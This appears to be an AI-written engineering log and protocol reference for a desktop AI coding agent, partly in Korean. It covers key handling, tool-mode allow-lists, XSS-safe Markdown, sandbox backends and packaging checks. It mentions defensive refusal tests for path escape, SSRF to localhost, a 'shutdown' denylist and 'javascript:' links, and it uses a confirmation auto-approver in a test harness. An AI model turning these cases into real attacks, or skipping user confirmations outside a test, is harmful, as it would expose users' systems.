| `src/tonyagent/core/modes.py` | the four modes: system prompt + tool allow-list (Phase 3) |
| `app/src/events.test.ts` | the reducer's suite (Phase 3) - found the mutation bug on its first run |
| `tests/unit/test_modes_and_diffs.py` | modes + diff stats (Phase 3) |
| `providers.list` (core) | so the panel asks the registry instead of carrying a hardcoded provider list that would drift the moment a provider is added or renamed |
| `project` in `state`/`sandbox.start` | a reloaded window otherwise cannot tell what folder the core is attached to |

Two decisions worth keeping:

- **Trust state lives in `App`, not the panel.** The core keeps the trusted set
  in memory with no getter, so the UI cannot ask. It remembers what it asked
  for instead, and defaults to *untrusted* - the safe direction to be wrong in,
  because a wrongly-trusted folder skips the confirmation prompt.
- **Provider/model are a draft until Apply.** Two round trips per keystroke
  would be its own bug, and model ids are provider-specific, so changing the
  provider clears the model.

The Files panel's empty state now offers the picker directly. A panel that only
explains itself is the dead end this replaces.

### 1.4 Phase 2: API keys and search

**The key rules, and why they are the way they are.** A key arrives on stdin
and must not leave by any other route. The problem is that both output streams
are *displayed*: stdout frames become the transcript, the error banner and the
event log, and stderr becomes the log strip. So a key that reaches either one
is a key on screen. Four consequences:

- **The reply carries only the provider name.** Never an echo, never a masked
  form - a masked prefix still identifies the key to anyone who has seen it.
- **Errors are re-raised with a fixed message, never `str(exc)`.** The real
  keyring backend quotes the value it refused inside its own exception, so
  returning it would put the rejected secret in the error banner. The fake in
  `test_a_keyring_failure_does_not_echo_the_key` reproduces exactly that.
- **There is no `key.get`, and there must not be one.** A method that returns a
  secret is a method whose secret can end up in a screenshot. This is pinned by
  `test_there_is_no_method_that_returns_a_key`, which fails the moment someone
  adds one.
- **The frontend field clears on both success and failure.** A field that keeps
  a credential in the DOM after storing it is a field that ends up in a support
  bundle. The client cannot redact what it sends - the core needs the real value
  - so its only job is never to *display* it.

`carriesSecret()` in `backend.ts` exists so the one place that could leak a key
(a debug log of an outgoing frame) is hard to add by accident.

**Search delegates to `GrepTool`, it does not reimplement the scan.** A second
implementation would be a second set of rules about which directories to skip
and how a path is confined to the project, and the two would drift - so the
search a user runs and the search the agent runs would quietly answer different
questions. `test_search_matches_the_same_rules_the_agent_gets` fails if the
protocol ever grows its own scanner. The panel also cannot start before a
folder is chosen, because grep resolves paths against the project root.

### 1.5 Phase 3: real modes and real diff stats

**Modes are enforced, not requested.** A mode sets a system prompt *and* an
allow-list, and only the second one is a permission. Prompt text produces a
model that says "I will not modify that file" and then modifies it. So the
schema is filtered (advisory -- it stops the model wanting the tool) *and* the
orchestrator refuses the call (the guarantee -- it holds even if the model
hallucinates a tool it was never shown). The refusal happens **before**
argument validation and **before** the confirmation prompt: asking the user to
approve something a mode was meant to make impossible is worse than the tool
running.

`test_the_orchestrator_refuses_a_tool_the_mode_forbids` asserts the file does
not exist afterwards, not merely that an error came back -- otherwise the test
would also pass if `write_file` were simply broken.
`test_the_same_call_succeeds_once_the_mode_allows_it` exists to rule out that
false pass.

Two other decisions worth keeping:

- **Switching mode clears the conversation.** A "you cannot write files" system
  prompt that outlives Plan leaves the model obeying a rule the user has
  already switched off.
- **`mode.set` replies with the mode actually in force**, not the one asked
  for. An unknown name resolves to Build, and echoing the request would leave
  the UI showing a mode that is not active.
- **The pills come from `mode.list`.** Same reasoning as `providers.list`: a
  hardcoded list drifts from the allow-lists behind it. There is also a test
  that every registered tool is reachable in *some* mode -- it immediately
  caught `http_request` being in no allow-list, i.e. dead code.

**Diff stats are a real line diff.** `write_file` used to report only a char
count, so the Files tree invented a badge by counting tool invocations and
scraped the path out of an English sentence -- which meant a file the agent
merely *read* appeared in the tree. Now the mutating tools emit a
`file_change` artifact with a `difflib` line diff, and the tree reads that.
`test_rewriting_a_file_reports_a_real_line_diff` is the case a length
comparison gets wrong: same character count, one line changed, a length diff
reports nothing at all.

A `0/0` change is passed through and the sidebar hides it. Showing "+0 -0"
would claim a file was edited when a no-op write touched nothing.

### 1.6 Phase 4: assistant text is Markdown

Assistant messages were plain text with `white-space: pre-wrap`. They are now
parsed and rendered as Markdown. Two decisions carried it:

- **A dependency-free parser, not a library.** The `NEXT_SESSION` note that
  preceded this said the core "already depends on `markdown2` for the Tkinter
  UI". That is not true and was worth checking: `markdown2` is declared in
  `pyproject.toml` but imported nowhere, in either UI. So there was nothing to
  reuse, and the choice was a new dependency or a parser. The parser won: the
  frontend's protocol tests must keep running in plain Node with no build
  toolchain and no network install, and a new package would have broken that on
  the first `npm ci` without a network.

- **Token tree, never an HTML string.** The obvious shortcut -- build an HTML
  string and hand it to `dangerouslySetInnerHTML` -- turns every model
  completion into an XSS surface. Assistant text is untrusted output from a
  remote model. `markdown.ts` is pure and returns a typed tree of blocks and
  inlines; `MarkdownText.tsx` maps that tree to React elements, so React escapes
  every string and the only place a URL reaches the DOM is a sanitised `<a>`.
  `markdown.test.ts` pins the security cases: a `javascript:` link keeps its
  text and loses its href, and a remote image renders as its alt text rather
  than becoming a tracking beacon.

It implements a deliberate subset -- fenced code (with an unterminated fence
running to the end, which is the streaming case), headings, ordered/unordered
lists, blockquotes, rules, and inline code/strong/em/strike/links. A missing
feature degrades to plain text, which is exactly what rendered before. Only
*assistant* text is parsed; a user's message is shown as typed, because someone
who pasted `**not bold**` meant the asterisks.

Two smaller things this surfaced:

- **`markdown.ts` and `Markdown.tsx` differ only in case**, which collides on a
  case-insensitive filesystem. `tsc` refused the whole program with TS1149. The
  component is `MarkdownText.tsx` now. Any future module pair here must not
  differ only in case.
- **The assistant bubble must reset `white-space`.** `.bubble` sets `pre-wrap`
  for user text and tool output; leaving it on for rendered Markdown makes the
  whitespace between block elements significant.

### 1.7 Phase 5: custom model and endpoint, and the first live turn check

A provider's `models` list is a set of *suggestions*, not a closed set. The
settings panel used to render it as a `<select>`, so the only bindable OpenRouter
models were the four the registry happens to list -- and OpenRouter serves
hundreds of namespaced ids (`anthropic/claude-sonnet-4.5`,
`deepseek/deepseek-chat:free`). Self-hosted gateways are worse: their ids are
ones the registry has never heard of.

What changed:

- **The model field is free text.** It became `<input list="model-suggestions">`
  with a `<datalist>` of the provider's known ids -- native combobox behaviour,
  no dependency, and any typed id binds as-is. (The Tkinter `PillComboBox`
  already allowed typing, so only the React panel needed this.)
- **`bind_provider` takes an optional `base_url`,** echoed back in the reply;
  `state` reports it too. The panel grew an optional Base URL row.
- **This is what makes `custom` usable.** That provider raises `ValueError`
  without a `base_url`; the handler now converts that into a `rejected` reply
  with the provider's own message instead of an opaque `internal` error.
- **No new protocol surface beyond one optional field.** `session.bind_provider`
  gained a third argument (defaulting to `""`, so the Tkinter call site is
  untouched) and `ProviderFactory.create_provider` already accepted `base_url`.

**The first live turn check.** Two runs, both worth recording:

1. *Through the real protocol, against OpenRouter.* Spawned the sidecar,
   `ping`, `bind_provider {name: openrouter, model: <a custom id>}`, `send`.
   The custom model id round-tripped exactly, `message.started` streamed, and
   then `turn.failed` carried the provider's own error verbatim (`403 Key limit
   exceeded (total limit)`, and for free slugs `rate_limit`). The core path is
   *sound*; the failure was billing. This is the first time the whole sidecar
   turn path has been driven against a live endpoint.
2. *A complete successful turn, against a local mock.* Stood up a tiny
   OpenAI-compatible SSE server and bound the `custom` provider to it through
   the new `base_url` field (with a dummy in-memory key, so the OS keyring was
   never touched). The full lifecycle ran: `turn.started` -> `message.started`
   -> six `message.delta`s -> `message.completed` -> `turn.finished`, and the
   deltas reassembled into the expected text. That is the new endpoint feature
   working end to end, and the turn machinery proven to *complete*.

Still missing: one successful reply from a **hosted** model. That needs the
user to raise or replace the OpenRouter key; it is the only remaining gap in
this phase (see section 5 item 10).

### 1.8 Checking the packaged app, and what that found

The release build was verified by running it, not by trusting the suite. MSI
48.36 MiB / NSIS 47.43 MiB, then `tonyagent-app.exe` launched with
`WEBVIEW2_ADDITIONAL_BROWSER_ARGUMENTS="--remote-debugging-port=9333"` and read
over CDP. Confirmed *in the packaged build* rather than in `vite dev`:

- sidecar spawns, `state` reports `openrouter / openrouter/auto` -- the Phase 5
  startup bind and the empty-model fix, working from the embedded binary;
- the Settings modal carries the free-text Model input with its `datalist` and
  the Base URL row; `Remove` is present, so a real key is in the keyring;
- `document.fonts` reports Inter and JetBrains Mono as **loaded**, so the
  `font-src 'self'` CSP entry still works after packaging -- worth re-checking
  every time, because a missing font-src fails silently as a system-font
  fallback rather than as an error;
- `markdown.ts` and the `.md-*` rules are present in the shipped
  `dist/assets` bundle and CSS;
- a real turn: the request reached OpenRouter and was rejected with
  `Key limit exceeded (total limit)`, and the error surfaced with a message
  about the user's own key. That is the send path verified live; the only
  thing still unproven live is a **successful** assistant reply.

That last point is why the empty-bubble bug above is worth recording: it was
invisible to 54 TypeScript tests and to a real turn, and appeared only because
the app was actually run against a failing key.


### 1.9 The bounded tool loop, and the first successful live turn

The first live end-to-end turn happened: a working key went in via Settings,
"Hi." was sent, the model called `list_dir`, got "No project folder selected",
asked for another tool -- and the session answered **"Model requested more
tools after a tool result."** That banner was not an OpenRouter quirk:
`_run_turn` deliberately allowed exactly ONE tool round and errored on the
second. One round is not the honest number for an agent ("list the files, then
open the one that looks relevant" is a normal request), so the turn now loops:

- `MAX_TOOL_ROUNDS = 6` on `AgentSession` -- a cost bound, not a claim that six
  is the right number; `_run_tool_calls` numbers the rounds it executes;
- hitting the cap emits an ERROR that says so ("Stopped after 6 tool rounds.")
  and still ends the turn with TURN_FINISHED, not TURN_FAILED;
- two history bugs the loop would have tripped over on its very second request,
  both found by the new tests rather than by another live failure:
  - a tool-call pass carrying no text was not appended to history at all, so
    the next request sent `[user, tool]` -- and OpenAI-compatible APIs reject a
    tool message whose preceding assistant turn (carrying the matching
    `tool_calls`) is missing;
  - a turn whose last act was a tool call left the history ending on a bare
    tool result. `_append_results_digest()` now closes exactly that shape with
    an assistant note ("Tool results are above..." plus one `[result N]` per
    round), and leaves turns that produced a real answer untouched.

Verified: Python 404 passed, TS 54, `tsc --noEmit` clean, sidecar rebuilt.
Still unproven live: a multi-round turn in the packaged app, and Markdown
rendering of a real reply.


### 1.10 Every tool exercised live

`scripts/e2e_all_tools.py` runs all 22 registered tools for real against a
temp project: 10 host-side tools with their actual side effects (write + diff
artifact, edit, delete-to-recycle-bin, grep/glob, http_request), the security
refusals a model will eventually provoke (path escape, SSRF to 127.0.0.1,
`shutdown` against the command denylist), and -- with Docker up -- all 13
sandbox tools including a full browser round-trip (navigate a real page,
snapshot, click a link, type into a form, screenshot saved into the
workspace). 28/28 checks pass in ~6s; `--fast` skips the sandbox group and
instead asserts every sandbox tool fails CLOSED with an actionable message.

Two observations worth keeping: `browser_type` against a page with no
matching element costs a 30s Playwright timeout (the harness navigates to a
`data:` URL form it controls instead), and `list_dir` recursive output uses
OS separators, so on Windows the model sees `sub\\deep.txt` -- cosmetic, but
a cross-platform agent will meet it.

### 1.12 Docker is no longer required for 20 of the 22 tools

The single biggest source of friction in this project was that the agent
appeared to need Docker to do anything. It does not, and the reason it looked
like it did is worth recording precisely.

**Docker was never load-bearing for most of the tools.** A headless browser and
a read of a workspace file are not shell escapes. Of the 22 tools, 20 need only
a *runtime*; exactly 2 -- `execute_command` and `execute_js` -- need a runtime
that *contains* what runs inside it. Conflating those two words is what made
the dependency look total.

The mechanism turned out to be cheap, because `SandboxBackend` was already
written as a JSON-RPC client: every public method is built on one abstract
primitive, `_send_request`. So:

- `docker/sandbox/rpc_server.py` had exactly one real coupling to the
  container: a hardcoded `/workspace`, in 10 places. It is now
  `TONYAGENT_WORKSPACE`, defaulting to `/workspace` so the container is
  unaffected. That was the whole blocker.
- `tonyagent/sandbox/local_backend.py` loads that **same file** into the core's
  own process. Dispatch is in-process rather than over a pipe, because in the
  packaged sidecar `sys.executable` is the PyInstaller binary and does not run
  a script passed to it. The handler code, the framing and the timeouts are
  therefore still shared with the container -- one implementation, two places
  to run it.
- `provides_isolation` (backend) and `isolation_required` (tool) are the new
  axis. `SandboxManager.get_backend()` still means "the isolating one"; the new
  `get_runtime_backend()` means "whatever can serve a tool that does not need
  containment", preferring the container so turning Docker on stays an upgrade.

**Three bugs fell out of the investigation, all of them pre-existing:**

1. `SandboxManager._detect_backend()` ended in `return "docker"`
   unconditionally, so a machine with no daemon was told to start Docker. Its
   DISM probe for the Windows optional feature needs an **elevated** shell
   (error 740 without one), so the `WsbSandboxBackend` branch was unreachable
   for ordinary users. It now ends in `return "local"`.
2. `WsbSandboxBackend` is a stub: `_connect_pipe`, `_read_responses` and
   `_send_request` are all `pass`, and the `LogonCommand` it writes names a
   `tonyagent_sandbox.rpc_server` module that does not exist. It was left in
   place with a docstring saying so rather than deleted, because deleting it
   would hide that the gap exists. It stays `provides_isolation = False`, so a
   stub that cannot contain anything is never selectable as the thing that
   does.
3. The frontend bailed out of folder selection when `!result.running`, while
   the core had in fact registered the folder and 20 working tools. `running`
   and `isolated` are now separate fields, and the panel shows a `.notice` (a
   degraded-but-working style, deliberately not the error style) instead of
   silently disabling Files and Search.

**Packaging.** `rpc_server.py` (19 KB) is always bundled, because a packaged
app has no repository to read it from and the failure mode is a tool that works
in a checkout and silently does nothing when installed. Playwright is
**opt-in** via `build_sidecar.py --with-browser`: its driver alone is ~101 MiB,
which would take the installer from 48 MiB to ~150 MiB for one feature. Without
it the browser tools report a missing-Playwright error rather than failing to
start. The browser itself is not bundled either -- `rpc_server.py` tries system
Edge, then Chrome, then Playwright's own Chromium, and Edge ships with Windows.

**Verified with the daemon genuinely stopped** (`docker version` refused):
`scripts/e2e_no_docker.py` is **17/17** -- file read/write/edit, list, grep,
sandbox read/list, an HTTP round trip, and `browser_navigate` /
`browser_get_text` / `browser_snapshot` against example.com through system
Edge, with `execute_command` and `execute_js` both correctly refused. The
**packaged** sidecar was then driven over stdio and answered
`{"running": true, "isolated": false}`, including with the repository's
`docker/` directory renamed away, which is what proves the bundled copy is the
one being used.

`tests/unit/test_local_sandbox.py` (16 tests) pins the parity between the
`Tool` classes and the hand-written `schemas.py` dicts, which duplicate these
flags and had no check keeping them honest.

### 1.11 The packaged app, verified end to end

The installers were rebuilt so they actually contain the tool loop and the
rail rework (`npx tauri build`; MSI 48.36 MiB, NSIS 47.43 MiB). The stale
`Model requested more tools after a tool result.` banner the user was seeing
was not a live bug: it was the `61e4c69` build, which predates the loop.

Verified in the built `tonyagent-app.exe` over CDP (`--remote-debugging-port=9333`):

- **Rail.** Closed by default at 70px with zero labels; the TopBar toggle
  expands to 248px with all five labels and persists `stored=1`; the rail's own
  toggle button collapses it back.
- **Tool loop.** A three-round chain (`write_file` -> `read_file` -> `list_dir`)
  streams to a final Markdown answer with **zero** error elements in the DOM.
  The old banner does not reappear.
- **Markdown.** `## ` became `div.md-h.md-h2`, bullets/ordered lists became
  `md-list`+`md-ul`/`md-ol`, and backticks became `md-code`.

The real model could not be used (the stored OpenRouter key reported "Key
limit exceeded"), so the turn was driven against a throwaway local
OpenAI-compatible SSE server bound as the `custom` provider. Then the **shipped
sidecar binary** (`app/src-tauri/binaries/tonyagent-core-*.exe`) was driven over
stdio with a real project folder and a confirmation auto-approver: all three
tools returned `status: success`, the error list was empty, and
`notes/plan.md` existed on disk with the exact Markdown written. So the loop is
verified in the artifact that ships, not only in the source tree.

Three things worth knowing from that run:

- `write_file` is `destructive`, so it raises a `confirmation.requested` event
  and **times out to `cancelled` after 60s** if nobody answers. A headless
  driver must reply with `confirm.respond`.
- `sandbox.start` returns `{"running": false, "project": ""}` when Docker is
  down, but the folder is registered *before* the container starts, so the ten
  host tools keep working. Only the sandbox group is unavailable.
- A key shorter than the provider's declared length is rejected at bind time
  with an actionable message rather than a 401 -- worth keeping, it is the
  difference between a fixable message and a mystery.

### 1.13 One provider, and why the others went

Anthropic and Gemini were deleted (28 files, +142/-725) rather than left
unused. Two dialects with no way to exercise them is two claims nobody can
check, and `fe1e470` removed the modules, their tests, and their entries in the
provider registry together.

The finding worth keeping is what came with it. Every event was reaching the
window **three times** — a subscription leak in `App`, invisible because
streaming still worked and a duplicated message looks the same as a retried
one. It surfaced only while working on the reasoning channel, where three
copies of a delta are three copies of the model's thinking.

### 1.14 Conversations on disk

`core/conversations.py` is a new file, one JSON document per conversation. The
choice is deliberate against a single index: a corrupt conversation should
cost that one conversation, and a write costs one small file.

`list()` sorts on `(-updated_at, created_at)`. The tiebreak is not decoration —
it is what puts a copy directly beneath the conversation it came from, since
the copy shares the original's `updated_at` and was created later.

**`save(conversation, touch=True)` exists because two callers want different
things.** A turn that just happened should move a chat to the top. A *copy* is
about an older conversation and belongs next to it, so `duplicate()` passes
`touch=False`. Renaming **does** touch, and therefore **does** move a chat to
the top of the list. That is deliberate: "recently handled on top" is what the
sidebar has always meant, and a rename is a deliberate act by the reader. If
that ever stops being what you want, the change is one argument at
`conversations.py:rename`.

### 1.15 Reasoning on its own channel

`reasoning.delta` / `reasoning.completed` carry the model's thinking, and
`ChatMessage` keeps it in a `reasoning` field beside `text` rather than
inside it. An answer with scratchwork interleaved is a different thing from an
answer, and the wire format is what guarantees that: two events, two fields,
no merging to undo.

A restored message is born `reasoningComplete: true`, which is what makes a
reopened conversation show its panel folded rather than streaming forever.

### 1.16 The thinking panel, and the effort dial

`ThinkingPanel` in `MessageList.tsx` opens while the thinking streams and folds
when it completes — the trace is often longer than the answer, and a transcript
where every reply is twice its own length is one nobody reads. Folding is not
discarding: the text stays on the message, reopens with a click, and is in the
saved conversation.

Three rules earn their own tests because each is one edit from inverting:

- **A model that cannot think gets no panel at all**, not an empty one. A
  permanently collapsed "Thinking" header above every answer is furniture the
  user learns to ignore.
- **A panel the reader opened on purpose is not folded when the turn ends.**
  `touched` records that they chose to be looking at it.
- **The effort dial appears only when `reasoning.efforts.length > 0`.** A
  model that cannot reason, and one that reasons with no choice to make, both
  get nothing: a control that cannot change anything teaches the reader that
  the row is decoration.

The dial's value is whatever the core last reported, never a local guess
written when a value was clicked — the same rule the mode pills follow.

### 1.17 Two bugs that only a real run finds

**A conversation title in any non-ASCII script killed the app.** The sidecar's
stdout and stderr had been configured for UTF-8, and the request stream had
not: stdin still took the Windows console code page (cp949), so `café` was
stored as `caf챕` and a title of `한` raised `UnicodeEncodeError: surrogates not
allowed`. Tauri decodes its sidecar strictly, so a mangled byte in a title
reached the frontend as "the core died" — and any non-ASCII title took the
whole window down. All three streams are configured now, in
`configure_stdio()`. **The lesson is the asymmetry: fixing two of three streams
reads as fixing the bug, because the symptom is identical.**

**The same class of bug, one layer up:** a conversation title containing `…`
reached the log as non-UTF-8 and the strict decoder rejected it, which is how
an earlier launch crash was found. Both are the same failure — a Windows
process that believes its own console encoding and is wrong.

### 1.18 What the component tests found

`ConversationList.test.tsx`, `MessageList.test.tsx` and `Composer.test.tsx`
run under jsdom, and each new rule was verified by reversing it. One reversal
**passed**, which is the part worth recording: mutating the effort dial's
"default" option to carry the default effort's *name* instead of `""` left the
test green, because the test set the select to `""`, which then matched no
option at all and so never fired the callback it was asserting on. The test now
reads the option's own `value` back. A test that cannot fail is worth as much
as a test that does not exist — slightly less, because it reads like coverage.

The shared harness is `test-render.ts` plus the side-effect `test-dom.ts`.
The sixteen existing rename tests passed against the extracted harness
unchanged, which is what made moving it safe.

---

## T 로고: 단말을 각지게 다시 (2026-10-04)

**요청**: "이미지로 하니 깔끔하지 않아, 그냥 알파벳 T 로고를 당신이 SVG로
만들어." 이전 패스에서 T로 바꾸기는 했었지만, 이번에는 다시 그렸고
**근거가 되는 방식도 다르게** 했습니다.

### 무엇을 바꿨나

```
이전 (stadium)          지금 (flat)
crossbar 729 x 132      700 x 176      x=162
  rx 66                   rx 0
stem     163 x 600      204 x 512      x=410
  rx 81                   rx 0
ground   1024 rx 139    그대로
```

색은 그대로입니다 (`#2f6feb`). 바뀐 것은 `rx`와 두 개의 치수뿐입니다.

후보 여섯 개(|stadium / flat 3안 / soft corner / bold)를 cairo로 그려서
16·20·24·32·48·96px로 래스터를 읽어 보고 골랐습니다. 눈으로 고른 것이
아니고, **픽셀을 읽은 것입니다.**

### 제가 잘못 쓴 이유 (직접 고쳤다)

첫 문서에 "stem이 hairline으로 사라진다"고 적어 넣었는데, **다식이 틀렸습니다.**
163/1024 = 2.55px는 16px에서 solid 2px core로 살아남습니다(`.tmp/taskbar.py`
로 실측). 실제로 지운 항목은 따로였습니다: 132셀 지름이 `rx 66`을 쓰면
**안내의 상자가 아니라 정리되어** 16px에서 bar가 lozenge로 보입니다.

**`icon.svg`, `AppMark.tsx`, `AppMark.test.tsx`, `PROJECT_SUMMARY.md`의
이유 문장을 전부 측정 결과로 고쳤습니다.** 틀린 이유는 문서에도 남기고
싶어서, 이유 문장 자체를 "제가 틀렸던 부분"으로 남겼습니다.

### `--accent`는 움직이지 않았다

`tokens.css`에 "88.7%"가 적혀 있었는데 15개 래스터를 다시 세니 **99.25%**
입니다(평평한 모서리는 2px로만 안티에일리어스하므로). **토큰 값 자체는
그대로** — `#6393f0` 여전히 ramp 위에 있고 `--bg` `#1a1a1a` 위 5.77:1.

부수적으로 문서에 적혀 있던 **3.70:1도 틀렸습니다.** 다른 `--bg`를 재서
그린 값이었고, `--bg` `#1a1a1a` 기준으로는 3.81:1입니다. 고쳤습니다.

### exe에 묵은 아이콘이 남아 있었다 (이게 진짜 버그)

`npm run tauri icon`으로 15개 파일을 새로 만들고 `tauri build`까지 돌렸는데,
**exe 안의 아이콘은 옛 것이었습니다.** exe에서 RT_GROUP_ICON/RT_ICON을 열어
256×256 PNG를 꺼내 바인딩 파일과 픽셀 단위로 비교해서 발견했습니다.

원인은 두 가지입니다:

  * `target/release/build/*/out/resource.rc`의 타임스탬프가 멈춰 있고,
  * `build.rs`의 `rerun-if`가 icon 파일을 보지 않습니다.

즉 **`icon.ico`만 바꿔도 exe는 이전 생성을 계승합니다.**
`touch src-tauri/build.rs` 후 빌드해야 합니다. 앞으로 아이콘을 그릴 때마다
이 단계를 빼먹지 마십시오.

체커: exe의 리소스를 파싱해서 256 PNG를 꺼내 `icons/`의 파일과
`ImageChops.difference`로 비교. 스크래치로 `.tmp/exe_vs_ico.py`.

### 검증

```
npm test                exit 0   462 passed / 0 failed
npx tsc --noEmit        exit 0
pytest tests/unit -q    exit 0   592 passed / 7 skipped
                        (test_build_scripts.py 제외 — 매번 다른 4/24 실패,
                         원본 HEAD worktree에서도 재현)
tauri build             exit 0   MSI + NSIS
exe 리소스              0 differing px vs icon.ico[256]
레일 (CDP, 패키징드)    rx=0, x=162/410, 32px, currentColor
```

**뮤테이션 검증** 두 개: stem `y` 344 → 330(seam 어긋남), `rx` 0 → 40.
둘 다 잡혔습니다.

### 아직 손대지 않은 것

* `ios/` `android/` 아이콘 폴더는 디스크에 있습니다(untracked, 이전 패스 경유).
* 커밋하지 않았습니다.

---

### 가운데 폴더 버튼 (2026-10-04)

**요청**: "새 채팅에서 폴더 바꾸는 버튼이 화면 가운데에 있게 새로 만듭시다.
바꾸지 않으면 이전에 했던 프로젝트 폴더를 그대로 사용합니다."

`MessageList`의 빈 화면(첫 실행 패널)이 `.empty`이고, 이 패널은 이미
가로·세로 가운데 정렬입니다. 거기에 폴더 한 줄을 넣었습니다.

```
LiveProject  [Change...]
```

폴더가 있으면 이름 + **Change...**, 없으면 **No project folder** +
**Choose folder...**. 전체 경로는 이름의 `title`입니다.

### "바꾸지 않으면 그대로"는 이미 참이었고, 이제 보인다

core는 마지막 폴더를 `config.toml`에 쓰고 기동 시 되읽습니다
(`folder/manager.py::_restored_folder`), `state`가 그 경로를 그대로
보내므로 `App.project`는 재시작 후에도 채워집니다. `startNewChat`도
`project !== ""`면 아무것도 묻지 않습니다.

즉 **요청의 두 번째 절반은 동작이 아니라 표시에 관한 것이었습니다.**
폴더가 있는지도 모른 채 빈 화면이 "어디서 일하는지"를 말하지 않고 있었고,
그 사실을 확인할 곳이 설정 패널 안에뿐이었습니다. 이제 시작 화면에 있습니다.

### 규칙을 없애지 않고 좁혔다

빈 화면에는 **포커스되는 것이 하나도 없다**는 규칙이 있었고, 테스트가 강제하고
있었습니다. 요청대로 버튼을 넣으려면 깨야 했습니다. 지운 게 아니라 좁혔습니다:

| | 이전 | 지금 |
|---|---|---|
| 포커스 가능 | 0개 | `button.btn` **정확히 1개**, 이름까지 확인 |
| 태그 allowlist | `button` 없음 | `button` 추가 + 개수 1개까지 확인 |
| 핸들러 스캔 | 0개 | `["onClick="]` **정확히 1개** |

"0개"와 "1개, 그 하나가 폴더"는 두 번째 컨트롤이 생겼을 때 똑같이 실패합니다.
후자는 *어느* 컨트롤인지 말할 수 있습니다.

### 제가 틀린 것 두 가지 (테스트가 잡았습니다)

  * 폴더 이름을 `<span>`으로 썼는데 `span`이 allowlist에 없습니다. **맞습니다.**
    스캔의 존재 이유가 React 핸들러를 실을 수 있는 태그 catching이고 span이
    그런 태그입니다. allowlist를 넓혀 컴포넌트에 맞추는 대신 `<p>`로 바꿔
    **테스트의 약속을 손대지 않았습니다.**
  * 클릭 테스트가 버튼을 눌렀는데 호출이 0번. `canChooseFolder`를 넘기지
    않아서 **버튼이 제대로 disabled**였습니다. 컴포넌트가 맞고 테스트가 틀렸습니다.

### 검증

```
npm test                exit 0   471 passed / 0 failed  (462 -> 471)
npx tsc --noEmit        exit 0
pytest tests/unit -q    exit 0   592 passed / 7 skipped
tauri build             exit 0   MSI + NSIS

패키징드 빌드, CDP 실측 (1200x800)
  name          "LiveProject"
  title         C:\Users\iig2y\Desktop\LiveProject
  button        "Change..."   disabled=false
  centreOffset  0             (패널 가로중심과 정확히 일치)
  focusable     ["button.btn"]

"Clear conversation"(= 새 채팅) 클릭 후
  folder  LiveProject 그대로, 질문 없이 생성됨
  대화 목록의 새 항목이 LiveProject 그룹 아래에 생성됨
```

**뮤테이션 6건** 전부 잡힘: 패널에 두 번째 버튼 / 워드마크에 핸들러 /
`.empty`에 `tabIndex={-1}` / 가운데 버튼 미배선 / 골라도 미바인딩 /
취소 시 폴더 삭제.

**배선은 jsdom에서 검증했습니다.** 위에서 CDP로 못 본 것을 테스트로 막았습니다.
`App`의 `pickProject` 주입점(원래 "New chat"용 seam)이 아무 테스트도 쓰지 않고
남아 있었는데, 가운데 버튼이 그 다이얼로그에 도달하는지가 바로 그 지점입니다.

```
버튼이 배선 안 됨         -> 3개 실패
골라도 sandbox.start 없음 -> "binds what comes back" 실패
취소하면 폴더가 지워짐    -> "cancelling changes nothing" 실패
```

`picked === [FOLDER]`, `sandbox.start` 호출, 취소 시 폴더 유지까지 셉니다.

**그래도 못 한 것**: 사람이 마우스로 **진짜 OS 다이얼로그를 열어** 폴더를 고르는
것. 그건 자동화로 확인할 수 있는 종류가 아닙니다. 위 테스트는 다이얼로그를
stub으로 대체한 것이고, 실제 창이 뜨고 선택한 경로가 샌드박스에 붙는 마지막
한 뼘은 사람이 봐야 합니다.

### 커밋하지 않았습니다

---

## 2. The wire protocol (contract for the future UI)

Newline-delimited JSON on the sidecar's **stdout**. Logs go to **stderr** —
stdout is protocol-only, or the frontend will parse log lines as JSON.

### Request / reply
```json
{"id":1,"method":"send","params":{"text":"Hi"}}
{"id":1,"result":{"turn_id":"191908db..."}}
{"id":1,"error":{"code":"rejected","message":"no provider configured"}}
```

### Event (a push, not a response)
```json
{"event":true,"type":"message.delta","seq":3,"turn_id":"191908db...","payload":{"text":"Hel"}}
```

### Methods

| Method | Params | Result |
|---|---|---|
| `ping` | — | `{pong, protocol}` |
| `state` | — | `{provider, model, base_url, busy, messages, project}` |
| `send` | `{text}` | `{turn_id}` |
| `cancel` | — | `{cancelled}` |
| `clear` | — | `{cleared}` |
| `bind_provider` | `{name, model?, base_url?}` | `{provider, model, base_url}` |
| `providers.list` | — | `{providers: [{name, models, has_credentials, ...}]}` |
| `key.save` | `{provider, api_key}` | `{provider, saved}` |
| `key.delete` | `{provider}` | `{provider, deleted}` |
| `search` | `{pattern, path?, include?, case_sensitive?, max_results?, context_lines?}` | `{matches, output}` |
| `mode.list` | — | `{mode, modes: [{name, label, description, writes}]}` |
| `mode.set` | `{mode}` | `{mode, label, description, writes}` |
| `sandbox.start` | `{path?}` | `{running, project}` |
| `sandbox.stop` | — | `{running}` |
| `sandbox.stats` | — | stats dict |
| `confirm.respond` | `{id, confirmed}` | `{id, confirmed}` |
| `trust.set` | `{project, trusted}` | `{project, trusted}` |
| `conversations.list` | — | `{conversations: [{id, title, project, created_at, updated_at, message_count}]}` |
| `conversations.create` | — | the new conversation's summary |
| `conversations.switch` | `{id}` | the conversation's messages |
| `conversations.delete` | `{id}` | `{deleted}` |
| `conversations.rename` | `{id, title}` | the renamed conversation's summary |
| `conversations.duplicate` | `{id}` | the copy's summary |
| `reasoning.list` | — | `{model, supported, efforts, default_effort, mandatory, effort}` |
| `reasoning.set` | `{effort}` | `{effort, ...}` |

**25 methods.** A conversation's `summary` is deliberately not its transcript:
shipping the full history on every launch to draw a sidebar of titles is the
kind of thing that is fine at ten conversations and unusable at ten thousand.

### Artifacts inside a `tool.completed` result

`result.artifacts` is a list. One type is load-bearing for the UI:

```json
{"type": "file_change", "data": {"path": "src/app.py", "added": 12, "removed": 3}}
```

Emitted by `write_file`, `edit_file` and `delete_file`, and by nothing else.
`read_file` deliberately emits nothing, so a file the agent merely looked at
gains no row in the Files tree. `added`/`removed` are a real `difflib` line
diff, and a `0/0` pair means the write was a no-op -- the sidebar hides that
rather than showing a badge claiming an edit that did not happen.

**A failed tool emits no artifact.** Nothing changed on disk, and a badge the
filesystem contradicts is worse than no badge.

### Event types

`turn.started` `turn.finished` `turn.failed` `message.started` `message.delta`
`message.completed` **`reasoning.delta` `reasoning.completed`** `tool.started`
`tool.completed` `tool.failed` `confirmation.requested` `confirmation.resolved`
`sandbox.status` `sandbox.stats` `log` `error`

**`reasoning.*` is a separate channel, not a prefix of `message.*`.** The
model's thinking arrives on its own events so it can never be interleaved into
